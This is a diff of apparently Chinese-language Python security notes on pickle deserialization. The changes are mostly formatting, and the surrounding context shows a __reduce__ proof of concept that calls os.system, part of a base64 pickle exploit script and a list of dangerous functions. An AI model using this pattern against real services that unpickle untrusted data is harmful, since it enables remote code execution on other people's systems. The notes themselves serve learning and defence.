@@ -10,14 +10,16 @@ eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, 
 
 ### RCE
 poc
-```
+
+```python
 class Exploit(object):
     def __reduce__(self):
         return (os.system,('ls',))
 ```
+
 利用脚本
 
-```
+```python
 import _pickle as cPickle
 import sys
 import base64
@@ -40,7 +42,7 @@ print(base64.b64encode(cPickle.dumps(PickleRce())))
 
 输出opcode表
 
-```
+```python
 import pickletools
 import prettytable
  
@@ -341,6 +343,11 @@ __next__(self)	定义当迭代容器中的元素的行为
 __reversed__(self)	定义当被 reversed() 调用时的行为
 __contains__(self, item)	定义当使用成员测试运算符（in 或 not in）时的行为
 ```
+
+## 特殊属性
+
+``foo.func_code``
+``foo.func_globals``
 
 
 ## 拓展资料
